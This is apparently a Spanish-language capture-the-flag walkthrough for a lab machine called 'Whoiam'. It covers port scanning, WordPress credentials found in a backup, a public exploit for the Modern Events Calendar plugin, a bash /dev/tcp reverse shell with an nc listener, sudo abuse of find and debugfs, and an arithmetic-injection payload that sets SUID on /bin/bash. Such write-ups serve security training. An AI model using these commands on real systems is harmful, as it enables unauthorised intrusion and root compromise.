---
description: '✍️ Autor: Pylon🔍 Dificultad: Fácil  📅 Fecha de creación: 09/06/2024'
---

# Whoiam

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.18.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (860).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.18.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (861).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 80** perteneciente al **servicio HTTP** está abierto por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 172.18.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (862).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web llamada Whoiam.

<figure><img src="../../.gitbook/assets/image (863).png" alt=""><figcaption></figcaption></figure>

También al realizar el escaneo y al entrar en el código fuente vemos que hay un **WordPress**.&#x20;

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt,xml
```

<figure><img src="../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>

Nos llamada la atención el directorio `/backups` por lo que revisamos.

<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>

Nos lo descargamos y descomprimimos y contiene un usuario y su contraseña.

<figure><img src="../../.gitbook/assets/image (868).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales en **WordPress**.

<figure><img src="../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>

### &#x20;🚀 **EXPLOTACIÓN**

Vemos los plugins y hay uno que nos llama la atención.

<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>

Buscamos si contiene algún exploit.

```bash
searchsploit modern events calendar
```

<figure><img src="../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>

Nos descargamos el segundo exploit.

```bash
searchsploit -m php/webapps/50082.py
```

<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>

Ejecutamos el siguiente comando para crear una shell en el navegador.

```bash
python 50082.py -T 172.20.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

Entramos en la shell.

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

Nos enviamos una[ Reverse Shell](https://www.revshells.com/).

```bash
/bin/bash -c "bash -i >& /dev/tcp/172.20.0.1/443 0>&1"
```

Nos ponemos en escucha.

```bash
nc -nvlp 443
```

<figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos **SUDO** con el usuario **rafa** con **find** revisamos esta [página](https://gtfobins.github.io/gtfobins/find/).

```bash
sudo -u rafa /usr/bin/find . -exec /bin/sh \; -quit
```

<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos **SUDO** con el usuario **rubén** con **debugfs** revisamos esta [página](https://gtfobins.github.io/gtfobins/debugfs/).

```bash
sudo -u ruben /usr/sbin/debugfs
! /bin/sh
```

<figure><img src="../../.gitbook/assets/image (878).png" alt=""><figcaption></figcaption></figure>

El scrip verifica si el número ingresado es 42 para devolver "Correct". Aprovechando esto, podemos modificar el script para que establezca el bit SUID en `/bin/bash`. Esto permitirá que cualquier usuario que ejecute `/bin/bash` obtenga privilegios de `root`.

```bash
prueba[$(chmod u+s /bin/bash >&2)]+42
```

<figure><img src="../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>

```bash
bash -p
```

<figure><img src="../../.gitbook/assets/image (880).png" alt=""><figcaption></figcaption></figure>
